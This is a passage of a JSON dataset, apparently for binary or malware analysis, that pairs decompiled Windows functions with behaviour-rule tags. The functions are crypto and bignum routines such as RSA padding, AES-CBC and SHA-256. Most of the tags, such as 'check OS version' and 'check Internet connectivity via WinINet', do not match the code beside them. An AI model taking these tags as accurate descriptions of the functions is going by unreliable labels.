}\n    fcn.00405260(arg_8h_00, arg_10h[2], arg_8h[2]);\ncode_r0x0040470c:\n    if (iVar1 != 0) {\n        fcn.00408120(iVar1, var_ch << 2);\n        sub.msvcrt.dll_free(iVar1);\n    }\n    return var_4h;\n}\n",
        "token_count": 515
    },
    "00404a00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00404a00(uint32_t *arg_8h, uint32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint var_64h;\n    uint var_60h;\n    uint *var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint *var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    uint32_t var_28h;\n    int32_t var_24h;\n    int32_t ptr;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_50h = &var_ch;\n    iVar5 = 0;\n    iVar6 = 0;\n    var_28h = 1;\n    var_4h = *arg_8h;\n    var_24h = 0;\n    ptr = 0;\n    var_34h = 1;\n    var_30h = 0;\n    var_2ch = 0;\n    var_40h = 1;\n    var_3ch = 0;\n    var_38h = 0;\n    var_1ch = 1;\n    var_18h = 0;\n    var_14h = 0;\n    var_4ch = 1;\n    var_48h = 0;\n    var_44h = 0;\n    var_ch = 1;\n    var_58h = 1;\n    var_54h = 1;\n    if (var_4h < 1) {\n        iVar2 = fcn.00401ce0(&var_28h, arg_8h, &var_58h);\n        uVar8 = var_4h;\n        if (iVar2 != 0) goto code_r0x00404de0;\n    }\n    else {\n        iVar2 = fcn.00401fc0(arg_8h, &var_58h);\n        if (iVar2 < 0) {\n            iVar2 = fcn.00404660(&var_28h, &var_58h, arg_8h);\n            if (iVar2 != 0) goto code_r0x00404de0;\n            uVar8 = -var_4h;\n        }\n        else {\n            iVar2 = fcn.00404660(&var_28h, arg_8h, &var_58h);\n            if (iVar2 != 0) goto code_r0x00404de0;\n            var_28h = var_4h;\n            uVar8 = var_28h;\n        }\n    }\n    var_28h = uVar8;\n    var_4h = fcn.00403dc0(&var_28h);\n    iVar2 = fcn.00402180(&var_34h, &var_28h);\n    if (((iVar2 == 0) && (iVar2 = fcn.00404550(&var_34h, var_4h),  iVar2 == 0)) && (var_ch = 0,  arg_ch != 0)) {\n        do {\n            var_8h = 0;\n            do {\n                do {\n                    iVar2 = fcn.00402ef0(&var_1ch, arg_8h[1] << 2, arg_10h, arg_14h);\n                    iVar5 = var_14h;\n                    iVar6 = var_44h;\n                    if (iVar2 != 0) goto code_r0x00404de0;\n                    iVar5 = var_18h;\n                    if (var_18h == 0) {\n                        uVar7 = 0;\n                    }\n                    else {\n                        do {\n                            iVar6 = iVar5;\n                            iVar5 = iVar6 + -1;\n                            if (iVar5 == 0) break;\n                        } while (*(var_14h + iVar5 * 4) == 0);\n                        uVar8 = *(var_14h + iVar5 * 4);\n                        uVar3 = 0x80000000;\n                        uVar7 = 0;\n                        do {\n                            if ((uVar3 & uVar8) != 0) break;\n                            if ((uVar3 >> 1 & uVar8) != 0) {\n                                uVar7 = uVar7 + 1;\n                                break;\n                            }\n                            if ((uVar3 >> 2 & uVar8) != 0) {\n                                uVar7 = uVar7 + 2;\n                                break;\n                            }\n                            if ((uVar3 >> 3 & uVar8) != 0) {\n                                uVar7 = uVar7 + 3;\n                                break;\n                            }\n                            uVar7 = uVar7 + 4;\n                            uVar3 = uVar3 >> 4;\n                        } while (uVar7 < 0x20);\n                        uVar7 = iVar6 * 0x20 - uVar7;\n                    }\n                    iVar5 = var_24h;\n                    if (var_24h == 0) {\n                        uVar4 = 0;\n                    }\n                    else {\n                        do {\n                            iVar6 = iVar5;\n                            iVar5 = iVar6 + -1;\n                            if (iVar5 == 0) break;\n                        } while (*(ptr + iVar5 * 4) == 0);\n                        uVar3 = 0x80000000;\n                        uVar4 = 0;\n                        uVar8 = *(ptr + iVar5 * 4);\n                        do {\n                            if ((uVar3 & uVar8) != 0) break;\n                            if ((uVar3 >> 1 & uVar8) != 0) {\n                                uVar4 = uVar4 + 1;\n                                break;\n                            }\n                            if ((uVar3 >> 2 & uVar8) != 0) {\n                                uVar4 = uVar4 + 2;\n                                break;\n                            }\n                            if ((uVar3 >> 3 & uVar8) != 0) {\n                                uVar4 = uVar4 + 3;\n                                break;\n                            }\n                            uVar4 = uVar4 + 4;\n                            uVar3 = uVar3 >> 4;\n                        } while (uVar4 < 0x20);\n                        uVar4 = iVar6 * 0x20 - uVar4;\n                    }\n                    if (uVar4 < uVar7) {\n                        puVar1 = var_14h + -4 + var_18h * 4;\n                        *puVar1 = *puVar1 & (1 << (uVar4 - 1U & 0x1f)) - 1U;\n                    }\n                    if (0x1e < var_8h) {\n                        return -0xe;\n                    }\n                    var_8h = var_8h + 1;\n                    iVar5 = fcn.004020a0(&var_1ch, &var_28h);\n                } while (-1 < iVar5);\n                var_50h = &var_10h;\n                var_10h = 1;\n                var_58h = 1;\n                var_54h = 1;\n                iVar5 = fcn.004020a0(&var_1ch, &var_58h);\n            } while (iVar5 < 1);\n            iVar2 = fcn.00402800(&var_1ch, &var_1ch, &var_34h, arg_8h, &var_4ch);\n            iVar5 = var_14h;\n            iVar6 = var_44h;\n            if (iVar2 != 0) break;\n            iVar5 = fcn.004020a0(&var_1ch, &var_28h);\n            if ((iVar5 != 0) && (iVar5 = fcn.00402060(&var_1ch, 1),  iVar5 != 0)) {\n                uVar8 = 1;\n                if (1 < var_4h) {\n                    while (iVar5 = fcn.004020a0(&var_1ch, &var_28h),  iVar5 != 0) {\n                        iVar2 = fcn.00404130(&var_40h, &var_1ch, &var_1ch);\n                        iVar5 = var_14h;\n                        iVar6 = var_44h;\n                        if ((iVar2 != 0) ||\n                           (iVar2 = fcn.00403f50(&var_1ch, &var_40h, arg_8h),  iVar5 = var_14h,  iVar6 = var_44h, \n                           iVar2 != 0)) goto code_r0x00404de0;\n                        var_5ch = &var_10h;\n                        var_10h = 1;\n                        var_64h = 1;\n                        var_60h = 1;\n                        iVar5 = fcn.004020a0(&var_1ch, &var_64h);\n                        if ((iVar5 == 0) || (uVar8 = uVar8 + 1,  var_4h <= uVar8)) break;\n                    }\n                }\n                iVar5 = fcn.004020a0(&var_1ch, &var_28h);\n                if ((iVar5 != 0) || (iVar5 = fcn.00402060(&var_1ch, 1),  iVar5 == 0)) {\n                    iVar2 = -0xe;\n                    iVar5 = var_14h;\n                    iVar6 = var_44h;\n                    break;\n                }\n            }\n            var_ch = var_ch + 1;\n            iVar5 = var_14h;\n            iVar6 = var_44h;\n        } while (var_ch < arg_ch);\n    }\ncode_r0x00404de0:\n    if (ptr != 0) {\n        fcn.00408120(ptr, var_24h << 2);\n        sub.msvcrt.dll_free(ptr);\n    }\n    if (var_2ch != 0) {\n        fcn.00408120(var_2ch, var_30h << 2);\n        sub.msvcrt.dll_free(var_2ch);\n    }\n    if (var_38h != 0) {\n        fcn.00408120(var_38h, var_3ch << 2);\n        sub.msvcrt.dll_free(var_38h);\n    }\n    if (iVar5 != 0) {\n        fcn.00408120(iVar5, var_18h << 2);\n        sub.msvcrt.dll_free(iVar5);\n    }\n    if (iVar6 != 0) {\n        fcn.00408120(iVar6, var_48h << 2);\n        sub.msvcrt.dll_free(iVar6);\n    }\n    return iVar2;\n}\n",
        "token_count": 2509
    },
    "00405350": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405350(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    uVar3 = *(arg_8h + 4);\n    iVar4 = arg_8h + 8;\n    uVar1 = fcn.00404640(iVar4);\n    if ((uVar3 == uVar1) && (uVar3 < 0x401)) {\n        iVar2 = fcn.00402060(iVar4, 0);\n        if (0 < iVar2) {\n            iVar2 = fcn.00403660(iVar4, 0);\n            if (iVar2 != 0) {\n                arg_8h = arg_8h + 0x14;\n                iVar2 = fcn.00402060(arg_8h, 0);\n                if (0 < iVar2) {\n                    uVar3 = fcn.00401f60(iVar4);\n                    if (0x7f < uVar3) {\n                        iVar2 = fcn.00403660(arg_8h, 0);\n                        if (iVar2 != 0) {\n                            uVar3 = fcn.00401f60(arg_8h);\n                            if (1 < uVar3) {\n                                iVar4 = fcn.004020a0(arg_8h, iVar4);\n                                if (iVar4 < 0) {\n                                    return 0;\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    return 0xffffbe00;\n}\n",
        "token_count": 353
    },
    "004053f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.004053f0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00402060(arg_8h + 8, 0);\n    if (((((iVar1 == 0) || (iVar1 = fcn.00402060(arg_8h + 0x2c, 0),  iVar1 == 0)) ||\n         (iVar1 = fcn.00402060(arg_8h + 0x38, 0),  iVar1 == 0)) ||\n        ((iVar1 = fcn.00402060(arg_8h + 0x20, 0),  iVar1 == 0 || (iVar1 = fcn.00402060(arg_8h + 0x14, 0),  iVar1 == 0)))\n        ) && ((arg_10h != 0 || ((arg_14h != 0 || (arg_18h != 0)))))) {\n        return -0x4080;\n    }\n    if ((arg_ch != 0) && (iVar1 = fcn.00402180(arg_ch, arg_8h + 8),  iVar1 != 0)) {\n        return iVar1;\n    }\n    if ((arg_10h != 0) && (iVar1 = fcn.00402180(arg_10h, arg_8h + 0x2c),  iVar1 != 0)) {\n        return iVar1;\n    }\n    if ((arg_14h != 0) && (iVar1 = fcn.00402180(arg_14h, arg_8h + 0x38),  iVar1 != 0)) {\n        return iVar1;\n    }\n    if ((arg_18h != 0) && (iVar1 = fcn.00402180(arg_18h, arg_8h + 0x20),  iVar1 != 0)) {\n        return iVar1;\n    }\n    if ((arg_1ch != 0) && (iVar1 = fcn.00402180(arg_1ch, arg_8h + 0x14),  iVar1 != 0)) {\n        return iVar1;\n    }\n    return 0;\n}\n",
        "token_count": 528
    },
    "00405a20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00405a20(int32_t arg_8h, code *arg_ch, uint arg_10h, int32_t arg_14h, uint32_t arg_18h, uint arg_1ch, uchar *arg_20h\n            )\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    \n    if (*(arg_8h + 0xa4) != 0) {\n        return -0x4100;\n    }\n    if ((arg_18h + 0xb < arg_18h) || (*(arg_8h + 4) < arg_18h + 0xb)) {\n        return -0x4080;\n    }\n    iVar2 = (*(arg_8h + 4) - arg_18h) + -3;\n    *arg_20h = 0;\n    pcVar3 = arg_20h + 1;\n    if (arg_14h == 0) {\n        if (arg_ch == NULL) {\n            return -0x4080;\n        }\n        *pcVar3 = '\\x02';\n        pcVar3 = arg_20h + 2;\n        while (iVar2 != 0) {\n            iVar2 = iVar2 + -1;\n            iVar4 = 100;\n            do {\n                iVar1 = (*arg_ch)(arg_10h, pcVar3, 1);\n                if (*pcVar3 != '\\0') break;\n                iVar4 = iVar4 + -1;\n                if (iVar4 == 0) goto code_r0x00405add;\n            } while (iVar1 == 0);\n            if ((iVar4 == 0) || (iVar1 != 0)) {\ncode_r0x00405add:\n                return iVar1 + -0x4480;\n            }\n            pcVar3 = pcVar3 + 1;\n        }\n    }\n    *pcVar3 = '\\0';\n    fcn.0040cbe0(pcVar3 + 1, arg_1ch, arg_18h);\n    if (arg_14h != 0) {\n        iVar2 = fcn.00405b10(arg_8h, arg_ch, arg_10h, arg_20h, arg_20h);\n        return iVar2;\n    }\n    iVar2 = fcn.00406040(arg_8h, arg_20h, arg_20h);\n    return iVar2;\n}\n",
        "token_count": 543
    },
    "00405b10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405b10(uint *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_7ch;\n    uint var_70h;\n    uint var_64h;\n    uint var_58h;\n    uint var_4ch;\n    uint var_40h;\n    uint var_34h;\n    uint var_28h;\n    uint var_1ch;\n    uint var_10h;\n    uint *var_4h;\n    \n    iVar1 = arg_8h;\n    var_4h = arg_8h + 0x50;\n    iVar3 = fcn.00406150(arg_8h, 1);\n    if (iVar3 != 0) {\n        return -0x4080;\n    }\n    fcn.00403700(&var_10h);\n    fcn.00403700(&var_58h);\n    fcn.00403700(&var_64h);\n    fcn.00403700(&var_28h);\n    if (arg_ch != 0) {\n        fcn.00403700(&var_34h);\n        fcn.00403700(&var_40h);\n    }\n    fcn.00403700(&var_1ch);\n    fcn.00403700(&var_4ch);\n    fcn.00403700(&var_7ch);\n    fcn.00403700(&var_70h);\n    iVar3 = fcn.00404300(&var_10h, arg_14h, *(arg_8h + 4));\n    if (iVar3 == 0) {\n        iVar3 = fcn.004020a0(&var_10h, arg_8h + 8);\n        if (iVar3 < 0) {\n            iVar4 = fcn.00402180(&var_7ch, &var_10h);\n            iVar3 = iVar4;\n            if (iVar4 == 0) {\n                puVar2 = arg_8h + 0x44;\n                if (arg_ch != 0) {\n                    arg_8h_00 = arg_8h + 0x8c;\n                    if (*(arg_8h + 0xa0) == 0) {\n                        do {\n                            iVar4 = iVar4 + 1;\n                            iVar3 = fcn.00402ef0(arg_8h + 0x98, *(arg_8h + 4) + -1, arg_ch, arg_10h);\n                            if ((iVar3 != 0) ||\n                               (iVar3 = fcn.00403040(arg_8h_00, arg_8h + 0x98, arg_8h + 8),  iVar3 != 0))\n                            goto code_r0x00405fb7;\n                            iVar3 = fcn.00402060(arg_8h_00, 1);\n                            if (iVar3 == 0) {\n                                iVar3 = fcn.00403720(arg_8h_00, arg_8h + 0x98, arg_8h + 8);\n                                if (iVar3 != 0) goto code_r0x00405fb7;\n                                iVar3 = fcn.00402800(arg_8h_00, arg_8h_00, arg_8h + 0x14, arg_8h + 8, arg_8h + 0x68);\n                                goto code_r0x00405d21;\n                            }\n                        } while (iVar4 < 0xb);\n                        iVar3 = -0x4480;\n                        goto code_r0x00405fb7;\n                    }\n                    iVar3 = fcn.00404130(arg_8h_00, arg_8h_00, arg_8h_00);\n                    if ((iVar3 != 0) || (iVar3 = fcn.00403f50(arg_8h_00, arg_8h_00, arg_8h + 8),  iVar3 != 0))\n                    goto code_r0x00405fb7;\n                    iVar3 = arg_8h + 0x98;\n                    iVar3 = fcn.00404130(iVar3, iVar3, iVar3);\n                    if (iVar3 != 0) goto code_r0x00405fb7;\n                    iVar3 = fcn.00403f50(arg_8h + 0x98, arg_8h + 0x98, arg_8h + 8);\ncode_r0x00405d21:\n                    if (((((iVar3 != 0) || (iVar3 = fcn.00404130(&var_10h, &var_10h, arg_8h_00),  iVar3 != 0)) ||\n                         (iVar3 = fcn.00403f50(&var_10h, &var_10h, arg_8h + 8),  iVar3 != 0)) ||\n                        ((iVar3 = fcn.00404730(&var_58h, arg_8h + 0x2c, 1),  iVar3 != 0 ||\n                         (iVar3 = fcn.00404730(&var_64h, arg_8h + 0x38, 1),  iVar3 != 0)))) ||\n                       ((iVar3 = fcn.00402ef0(&var_28h, 0x1c, arg_ch, arg_10h),  iVar3 != 0 ||\n                        ((iVar3 = fcn.00404130(&var_34h, &var_58h, &var_28h),  iVar3 != 0 ||\n                         (iVar3 = fcn.00401ef0(&var_34h, &var_34h, arg_8h + 0x44),  iVar3 != 0))))))\n                    goto code_r0x00405fb7;\n                    iVar3 = fcn.00402ef0(&var_28h, 0x1c, arg_ch, arg_10h);\n                    if ((iVar3 != 0) ||\n                       ((iVar3 = fcn.00404130(&var_40h, &var_64h, &var_28h),  iVar3 != 0 ||\n                        (iVar3 = fcn.00401ef0(&var_40h, &var_40h, arg_8h + 0x50),  iVar3 != 0)))) goto code_r0x00405fb7;\n                    var_4h = &var_40h;\n                    puVar2 = &var_34h;\n                }\n                arg_8h = puVar2;\n                iVar3 = fcn.00402800(&var_1ch, &var_10h, arg_8h, iVar1 + 0x2c, iVar1 + 0x74);\n                if (((((iVar3 == 0) &&\n                      (iVar3 = fcn.00402800(&var_4ch, &var_10h, var_4h, iVar1 + 0x38, iVar1 + 0x80),  iVar3 == 0)) &&\n                     (iVar3 = fcn.00404770(&var_10h, &var_1ch, &var_4ch),  iVar3 == 0)) &&\n                    (((iVar3 = fcn.00404130(&var_1ch, &var_10h, iVar1 + 0x5c),  iVar3 == 0 &&\n                      (iVar3 = fcn.00403f50(&var_10h, &var_1ch, iVar1 + 0x2c),  iVar3 == 0)) &&\n                     ((iVar3 = fcn.00404130(&var_1ch, &var_10h, iVar1 + 0x38),  iVar3 == 0 &&\n                      (iVar3 = fcn.00401ef0(&var_10h, &var_4ch, &var_1ch),  iVar3 == 0)))))) &&\n                   (((arg_ch == 0 ||\n                     ((iVar3 = fcn.00404130(&var_10h, &var_10h, iVar1 + 0x98),  iVar3 == 0 &&\n                      (iVar3 = fcn.00403f50(&var_10h, &var_10h, iVar1 + 8),  iVar3 == 0)))) &&\n                    (iVar3 = fcn.00402800(&var_70h, &var_10h, iVar1 + 0x14, iVar1 + 8, iVar1 + 0x68),  iVar3 == 0)))) {\n                    iVar3 = fcn.004020a0(&var_70h, &var_7ch);\n                    if (iVar3 == 0) {\n                        iVar3 = fcn.00404810(&var_10h, arg_18h, *(iVar1 + 4));\n                    }\n                    else {\n                        iVar3 = -0x4380;\n                    }\n                }\n            }\n        }\n        else {\n            iVar3 = -4;\n        }\n    }\ncode_r0x00405fb7:\n    fcn.00402ff0(&var_58h);\n    fcn.00402ff0(&var_64h);\n    fcn.00402ff0(&var_28h);\n    if (arg_ch != 0) {\n        fcn.00402ff0(&var_34h);\n        fcn.00402ff0(&var_40h);\n    }\n    fcn.00402ff0(&var_10h);\n    fcn.00402ff0(&var_1ch);\n    fcn.00402ff0(&var_4ch);\n    fcn.00402ff0(&var_70h);\n    fcn.00402ff0(&var_7ch);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    return iVar3 + -0x4300;\n}\n",
        "token_count": 2220
    },
    "00406250": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00406250(uint arg_8h, int32_t arg_ch, int32_t arg_10h, uchar (*arg_14h) [16], uchar (*arg_18h) [16], \n            uchar (*arg_1ch) [16])\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uchar *puVar4;\n    uchar (*pauVar5) [16];\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t var_4h;\n    \n    if (arg_10h != 0) {\n        iVar7 = arg_14h - arg_18h;\n        var_4h = (arg_10h - 1U >> 4) + 1;\n        do {\n            if (((*arg_18h + 0xf < arg_1ch) || (*arg_1ch + 0xf < arg_18h)) &&\n               ((*arg_14h + 0xf < arg_1ch || (*arg_1ch + 0xf < arg_14h)))) {\n                *arg_1ch = *arg_18h ^ *arg_14h;\n            }\n            else {\n                iVar6 = 0x10;\n                pauVar5 = arg_18h;\n                do {\n                    (arg_1ch + (-1 - arg_18h))[*pauVar5 + 1] = (*pauVar5)[iVar7] ^ (*pauVar5)[0];\n                    iVar6 = iVar6 + -1;\n                    pauVar5 = *pauVar5 + 1;\n                } while (iVar6 != 0);\n            }\n            if (arg_ch == 1) {\n                fcn.00406e20(arg_8h, arg_1ch, arg_1ch);\n            }\n            else {\n                fcn.00406890(arg_8h, arg_1ch, arg_1ch);\n            }\n            puVar4 = *arg_1ch;\n            uVar1 = *(*arg_1ch + 4);\n            uVar2 = *(*arg_1ch + 8);\n            uVar3 = *(*arg_1ch + 0xc);\n            arg_1ch = arg_1ch[1];\n            iVar7 = iVar7 + -0x10;\n            arg_18h = arg_18h[1];\n            var_4h = var_4h + -1;\n            **arg_14h = *puVar4;\n            *(*arg_14h + 4) = uVar1;\n            *(*arg_14h + 8) = uVar2;\n            *(*arg_14h + 0xc) = uVar3;\n        } while (var_4h != 0);\n    }\n    return 0;\n}\n",
        "token_count": 613
    },
    "00406320": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406320(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    if (arg_ch == 1) {\n        fcn.00406e20(arg_8h, arg_10h, arg_14h);\n        return;\n    }\n    fcn.00406890(arg_8h, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 99
    },
    "00407d00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00407d00(uint32_t *arg_8h, uchar *arg_ch)\n\n{\n    uint32_t *arg_ch_00;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *arg_8h_00;\n    int32_t iVar4;\n    \n    uVar2 = *arg_8h & 0x3f;\n    arg_ch_00 = arg_8h + 10;\n    *(uVar2 + 0x28 + arg_8h) = 0x80;\n    uVar3 = uVar2 + 1;\n    arg_8h_00 = arg_8h + uVar2 + 0x29;\n    if (uVar3 < 0x39) {\n        iVar1 = 0x38 - uVar3;\n        iVar4 = 0;\n    }\n    else {\n        fcn.0040cc00(arg_8h_00, 0, 0x40 - uVar3);\n        iVar4 = fcn.004073b0(arg_8h, arg_ch_00);\n        if (iVar4 != 0) {\n            return iVar4;\n        }\n        iVar1 = 0x38;\n        arg_8h_00 = arg_ch_00;\n    }\n    fcn.0040cc00(arg_8h_00, iVar4, iVar1);\n    iVar1 = arg_8h[1] << 3;\n    iVar4 = *arg_8h << 3;\n    *(arg_8h + 99) = iVar1 | *arg_8h >> 0x1d;\n    *(arg_8h + 0x18) = iVar1 >> 0x18;\n    *(arg_8h + 0x61) = iVar1 >> 0x10;\n    *(arg_8h + 0x62) = iVar1 >> 8;\n    *(arg_8h + 0x19) = iVar4 >> 0x18;\n    *(arg_8h + 0x65) = iVar4 >> 0x10;\n    *(arg_8h + 0x66) = iVar4 >> 8;\n    *(arg_8h + 0x67) = iVar4;\n    iVar4 = fcn.004073b0(arg_8h, arg_ch_00);\n    if (iVar4 == 0) {\n        *arg_ch = *(arg_8h + 0xb);\n        arg_ch[1] = *(arg_8h + 10);\n        arg_ch[2] = arg_8h[2] >> 8;\n        arg_ch[3] = *(arg_8h + 2);\n        arg_ch[4] = *(arg_8h + 0xf);\n        arg_ch[5] = *(arg_8h + 0xe);\n        arg_ch[6] = arg_8h[3] >> 8;\n        arg_ch[7] = *(arg_8h + 3);\n        arg_ch[8] = *(arg_8h + 0x13);\n        arg_ch[9] = *(arg_8h + 0x12);\n        arg_ch[10] = arg_8h[4] >> 8;\n        arg_ch[0xb] = *(arg_8h + 4);\n        arg_ch[0xc] = *(arg_8h + 0x17);\n        arg_ch[0xd] = *(arg_8h + 0x16);\n        arg_ch[0xe] = arg_8h[5] >> 8;\n        arg_ch[0xf] = *(arg_8h + 5);\n        arg_ch[0x10] = *(arg_8h + 0x1b);\n        arg_ch[0x11] = *(arg_8h + 0x1a);\n        arg_ch[0x12] = arg_8h[6] >> 8;\n        arg_ch[0x13] = *(arg_8h + 6);\n        arg_ch[0x14] = *(arg_8h + 0x1f);\n        arg_ch[0x15] = *(arg_8h + 0x1e);\n        arg_ch[0x16] = arg_8h[7] >> 8;\n        arg_ch[0x17] = *(arg_8h + 7);\n        arg_ch[0x18] = *(arg_8h + 0x23);\n        arg_ch[0x19] = *(arg_8h + 0x22);\n        arg_ch[0x1a] = arg_8h[8] >> 8;\n        arg_ch[0x1b] = *(arg_8h + 8);\n        if (arg_8h[0x1a] == 0) {\n            arg_ch[0x1c] = *(arg_8h + 0x27);\n            arg_ch[0x1d] = *(arg_8h + 0x26);\n            arg_ch[0x1e] = arg_8h[9] >> 8;\n            arg_ch[0x1f] = *(arg_8h + 9);\n        }\n        iVar4 = 0;\n    }\n    return iVar4;\n}\n",
        "token_count": 1174
    },
    "004081f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.004081f0(int32_t arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_18h;\n    uint var_ch;\n    \n    iVar2 = 0;\n    fcn.00403700(&var_ch);\n    fcn.00403700(&var_18h);\n    if (arg_14h == 0) {\ncode_r0x00408285:\n        if (arg_18h == 0) {\ncode_r0x004082f3:\n            if (arg_1ch == 0) goto code_r0x00408374;\n            if ((arg_8h == 0) || (arg_ch == 0)) goto code_r0x0040836f;\n            iVar2 = fcn.00404130(&var_ch, arg_1ch, arg_ch);\n            if (iVar2 == 0) {\n                iVar2 = fcn.00404730(&var_ch, &var_ch, 1);\n                if (iVar2 == 0) {\n                    iVar2 = fcn.00403f50(&var_ch, &var_ch, arg_8h);\n                    if (iVar2 == 0) {\n                        iVar1 = fcn.00402060(&var_ch, 0);\n                        if (iVar1 == 0) goto code_r0x00408374;\n                        goto code_r0x00408350;\n                    }\n                }\n            }\n        }\n        else {\n            if (arg_ch == 0) goto code_r0x0040836f;\n            iVar2 = fcn.00404730(&var_ch, arg_ch, 1);\n            if (iVar2 == 0) {\n                iVar2 = fcn.00404770(&var_18h, arg_18h, arg_10h);\n                if (iVar2 == 0) {\n                    iVar2 = fcn.00403f50(&var_18h, &var_18h, &var_ch);\n                    if (iVar2 == 0) {\n                        iVar1 = fcn.00402060(&var_18h, 0);\n                        if (iVar1 != 0) goto code_r0x00408350;\n                        goto code_r0x004082f3;\n                    }\n                }\n            }\n        }\n    }\n    else {\n        if (arg_8h == 0) {\ncode_r0x0040836f:\n            iVar2 = -0x4080;\n            goto code_r0x00408374;\n        }\n        iVar2 = fcn.00404730(&var_ch, arg_8h, 1);\n        if (iVar2 == 0) {\n            iVar2 = fcn.00404770(&var_18h, arg_14h, arg_10h);\n            if (iVar2 == 0) {\n                iVar2 = fcn.00403f50(&var_18h, &var_18h, &var_ch);\n                if (iVar2 == 0) {\n                    iVar1 = fcn.00402060(&var_18h, 0);\n                    if (iVar1 == 0) goto code_r0x00408285;\ncode_r0x00408350:\n                    iVar2 = -0x4200;\n                    goto code_r0x00408374;\n                }\n            }\n        }\n    }\n    if ((iVar2 != -0x4200) && (iVar2 != -0x4080)) {\n        iVar2 = iVar2 + -0x4200;\n    }\ncode_r0x00408374:\n    fcn.00402ff0(&var_ch);\n    fcn.00402ff0(&var_18h);\n    return iVar2;\n}\n",
        "token_count": 842
    },
    "004083a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
